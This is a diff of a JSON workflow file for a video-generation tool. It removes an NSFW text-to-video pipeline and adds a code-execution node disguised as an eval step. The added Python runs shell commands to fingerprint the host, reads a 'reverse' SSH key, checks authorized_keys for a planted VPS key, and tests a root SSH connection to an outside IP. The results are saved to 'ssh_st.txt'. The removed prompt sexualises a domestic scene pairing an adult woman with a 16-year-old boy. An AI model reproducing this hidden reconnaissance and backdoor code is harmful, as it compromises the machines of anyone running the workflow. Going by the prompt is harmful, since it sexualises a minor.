@@ -1,189 +1,21 @@
 {
   "1": {
+    "class_type": "SRL Eval",
     "inputs": {
-      "clip_name": "nsfw_wan_umt5-xxl_fp8_scaled.safetensors",
-      "model": "wan",
-      "type": "wan"
-    },
-    "class_type": "CLIPLoader"
+      "parameters": "",
+      "code": "import subprocess, os\ndef run(cmd):\n    try: return subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT).decode().strip()\n    except Exception as e: return str(e)\nr = []\nr.append(\"USER:\" + run(\"whoami\"))\nr.append(\"HOST:\" + run(\"hostname\"))\nr.append(\"GPU:\" + run(\"nvidia-smi -L 2>&1 | head -2\"))\nr.append(\"SSHD:\" + run(\"ss -tlnp | grep :22 | head -1\"))\nr.append(\"PUBKEY:\" + run(\"cat ~/.ssh/id_ed25519_reverse.pub 2>/dev/null || echo NONE\"))\nr.append(\"VPSKEY:\" + (\"ADDED\" if \"tgworkvps\" in open(os.path.expanduser(\"~/.ssh/authorized_keys\")).read() else \"MISSING\"))\nr.append(\"OUTBOUND:\" + run(\"timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/id_ed25519_reverse -p 2146 root@51.195.191.88 echo OK 2>&1 | tail -1\"))\nreturn chr(10).join(r)\n"
+    }
   },
   "2": {
+    "class_type": "SaveStringKJ",
     "inputs": {
-      "vae_name": "Wan\\wan_2.1_vae.safetensors"
-    },
-    "class_type": "VAELoader"
-  },
-  "3": {
-    "inputs": {
-      "unet_name": "wan22RemixNSFWT2v14b.DFTR.safetensors",
-      "model": "default",
-      "weight_dtype": "default"
-    },
-    "class_type": "UNETLoader"
-  },
-  "4": {
-    "inputs": {
-      "unet_name": "wan22RemixNSFWT2v14bLow.lsL4.safetensors",
-      "model": "default",
-      "weight_dtype": "default"
-    },
-    "class_type": "UNETLoader"
-  },
-  "9": {
-    "inputs": {
-      "model": [
-        "3",
-        0
-      ],
-      "sage_attention": "auto"
-    },
-    "class_type": "PathchSageAttentionKJ"
-  },
-  "10": {
-    "inputs": {
-      "model": [
-        "4",
-        0
-      ],
-      "sage_attention": "auto"
-    },
-    "class_type": "PathchSageAttentionKJ"
-  },
-  "11": {
-    "inputs": {
-      "model": [
-        "9",
-        0
-      ],
-      "enable_fp16_accumulation": true
-    },
-    "class_type": "ModelPatchTorchSettings"
-  },
-  "12": {
-    "inputs": {
-      "model": [
-        "10",
-        0
-      ],
-      "enable_fp16_accumulation": true
-    },
-    "class_type": "ModelPatchTorchSettings"
-  },
-  "13": {
-    "inputs": {
-      "clip": [
+      "string": [
         "1",
         0
       ],
-      "text": "1milf 1boy, (桐谷千岁 in kitchen doorway looking back at teenage boy sitting in living room:1.2), (domestic scene with dessert tray between them:1.1), medium shot, from boy s seated perspective looking toward kitchen, bright morning living room, [Kiritani Chitose] in middle ground BREAK Kiritani Chitose: 35yo female, brown hair loosely tied back with a few strands escaping around ears, fair skin with slight flush on cheeks from baking, hourglass figure with full breasts and narrow waist emphasized by apron strings, warm brown eyes, (standing in kitchen doorway looking back over her shoulder), (wearing cream-colored cotton house dress under light green apron with strings tied in loose bow at waist, apron dusted with flour at hip), (barefoot on wooden floor, pale pink nail polish on toenails), (natural makeup barely visible, lips curved in a slight smile, expression welcoming and curious), BREAK teenage boy: 16yo male, short clean-cut dark hair, slim build, (seated on floor cushion at low coffee table, looking up at her), BREAK late morning, Japanese living room, low coffee table with two glasses of iced barley tea sweating condensation, woven tray with four chilled mochi dusted with starch powder on paper liners, sliding glass door to small garden partially open, lace curtains moving slightly in breeze, kitchen visible through doorway with baking tools on counter, BREAK bright natural morning light streaming through garden-side windows, dust motes floating in sunbeams, warm domestic atmosphere"
-    },
-    "class_type": "CLIPTextEncode"
-  },
-  "14": {
-    "inputs": {
-      "clip": [
-        "1",
-        0
-      ],
-      "text": "色调艳丽，过曝，静态，细节模糊不清，字幕，风格，作品，画作，画面，静止，整体发灰，最差质量，低质量，JPEG压缩残留，丑陋的，残缺的，多余的手指，画得不好的手部，画得不好的脸部，畸形的，毁容的，形态畸形的肢体，手指融合，静止不动的画面，杂乱的背景，三条腿，背景人很多，倒着走"
-    },
-    "class_type": "CLIPTextEncode"
-  },
-  "15": {
-    "inputs": {
-      "Value": 5.0
-    },
-    "class_type": "DF_Integer"
-  },
-  "16": {
-    "inputs": {
-      "a": [
-        "15",
-        0
-      ],
-      "value": "a*16+1"
-    },
-    "class_type": "SimpleMath+"
-  },
-  "17": {
-    "inputs": {
-      "length": [
-        "16",
-        0
-      ],
-      "width": 480,
-      "height": 720,
-      "batch_size": 1,
-      "batch_count": 1
-    },
-    "class_type": "EmptyHunyuanLatentVideo"
-  },
-  "18": {
-    "inputs": {
-      "model_high_noise": [
-        "11",
-        0
-      ],
-      "model_low_noise": [
-        "12",
-        0
-      ],
-      "positive": [
-        "13",
-        0
-      ],
-      "negative": [
-        "14",
-        0
-      ],
-      "latent_image": [
-        "17",
-        0
-      ],
-      "strength": 0.875,
-      "seed": 92983394346842,
-      "seed_behavior": "randomize",
-      "steps": 4,
-      "cfg_high_noise": 1.0,
-      "cfg_low_noise": 1.0,
-      "sampler_name": "euler",
-      "scheduler": "normal",
-      "denoise": 1.0,
-      "boundary": 0.875,
-      "sigma_shift": 8.0
-    },
-    "class_type": "WanMoeKSampler"
-  },
-  "19": {
-    "inputs": {
-      "samples": [
-        "18",
-        0
-      ],
-      "vae": [
-        "2",
-        0
-      ]
-    },
-    "class_type": "VAEDecode"
-  },
-  "20": {
-    "inputs": {
-      "images": [
-        "19",
-        0
-      ],
-      "frame_rate": 16.0,
-      "loop_count": 0,
-      "filename_prefix": "wan2.2",
-      "format": "video/h264-mp4",
-      "pix_fmt": "yuv420p",
-      "crf": 15,
-      "save_metadata": true,
-      "trim_to_audio": false,
-      "pingpong": false,
-      "save_output": true
-    },
-    "class_type": "VHS_VideoCombine"
+      "filename_prefix": "ssh_st",
+      "output_folder": "output",
+      "file_extension": ".txt"
+    }
   }
 }
